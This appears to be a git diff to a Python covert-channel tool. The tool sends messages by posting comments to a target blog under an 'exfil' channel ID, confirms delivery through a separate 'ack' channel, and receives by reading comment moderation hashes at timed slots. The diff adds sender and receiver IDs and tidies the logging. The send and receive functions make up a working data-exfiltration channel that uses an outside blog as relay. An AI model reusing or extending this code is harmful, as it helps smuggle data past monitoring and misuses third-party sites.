@@ -8,10 +8,12 @@ import urllib.parse
 from bs4 import BeautifulSoup
 
 class SendConfig:
+    sender_id = None
     send_time_solt = None
     confirm_time_slot = None
 
 class ReceiveConfig:
+    recvr_id = None
     recv_time_slot = None
     process_time_slot = None
     prev_unapproved_index = None
@@ -71,14 +73,14 @@ def submit_comment(blog_url, post_id, comment_str):
     curl_output = subprocess.check_output(curl_command, shell=True)
     return CommentResponse(curl_output.decode())
 
-def delay_to_timeslot(time_slot):
+def delay_to_timeslot(sender_id, time_slot):
     # Waits until the next time slot
 
     current_date = datetime.datetime.utcnow()
     target_date = get_next_timeslot_date(current_date, time_slot)
 
     time_diff = target_date - current_date
-    print("[INFO] Delaying for " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins")
+    print("[INFO] (" + sender_id + ") Delaying until " + str(target_date) + ": " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins")
 
     time.sleep(time_diff.seconds + (time_diff.microseconds / 1000000))
 
@@ -93,11 +95,8 @@ def get_next_timeslot_date(current_datetime, target_timeslot):
     if current_seconds >= target_timeslot:
         minute_offset += 1
 
-    print("## minute_offset: " + str(minute_offset))
     next_datetime = current_datetime.replace(minute=current_minute, second=target_timeslot, microsecond=0)
-    print("## next_datetime: " + str(next_datetime))
     next_datetime += datetime.timedelta(minutes=minute_offset)
-    print("## next_datetime: " + str(next_datetime))
 
     return next_datetime
 
@@ -156,24 +155,25 @@ def get_moderation_hash_from_url(url):
         return None
 
 def send_data(channel, data, send_config):
+    sender_id = send_config.sender_id
     while True:
-        delay_to_timeslot(send_config.send_time_slot)
+        delay_to_timeslot(send_config.sender_id, send_config.send_time_slot)
 
-        print("[INFO] Triggered at: " + str(datetime.datetime.now().time()))
+        print("[INFO] send_data: (" + sender_id + ") Sending data: " + str(datetime.datetime.now().time()))
 
         response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
-        print("## " + str(response.moderation_hash))
+        # print("## " + str(response.html_response))
+        print("## send_data: (" + sender_id + ") " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash))
 
         if send_config.confirm_time_slot:
-            delay_to_timeslot(send_config.confirm_time_slot)
+            delay_to_timeslot(send_config.sender_id, send_config.confirm_time_slot)
             response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.message_id)
-            print("## html_response: " + str(response.html_response))
             if "Duplicate" in response.html_response:
                 # If it's duplicated, that means that the server successfully got the message.
-                print("[INFO] Message submitted and confirmed.")
+                print("[INFO] send_data: Message submitted and confirmed.")
                 break
             else:
-                print("[INFO] Message was not received by server. Resending...")
+                print("[INFO] send_data: Message was not received by server. Resending...")
         else:
             break
 
@@ -193,25 +193,21 @@ def get_moderation_hash_at_current_time(channel):
 def receive_data(channel, num_of_receivers, recv_config):
     received_data = []
     
-    print("[INFO] Delaying to client timeslot. " + str(recv_config.recv_time_slot))
-    delay_to_timeslot(recv_config.recv_time_slot)
+    print("[INFO] Delaying to receive timeslot. " + str(recv_config.recv_time_slot))
+    delay_to_timeslot(recv_config.recvr_id, recv_config.recv_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time(channel)
 
     print("[INFO] Current hash is: " + current_hash)
-    print("[INFO] Delaying to server timeslot. " + str(recv_config.process_time_slot))
+    print("[INFO] Delaying to process timeslot. " + str(recv_config.process_time_slot))
 
-    delay_to_timeslot(recv_config.process_time_slot)
+    delay_to_timeslot(recv_config.recvr_id, recv_config.process_time_slot)
 
     index_client = 0
     processed_unapproved_indexes = []
             
     while index_client < num_of_receivers:
-        print("## checking index_client: " + str(index_client))
-        
         for index_offset in range(1, num_of_receivers + 1 + 1):
-            print("## recv_config.prev_unapproved_index: " + str(recv_config.prev_unapproved_index) + ", index_offset: " + str(index_offset))
             current_unapproved_index = recv_config.prev_unapproved_index + index_offset
-            print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
             if current_unapproved_index == server_index:
                 index_client += 1
                 continue
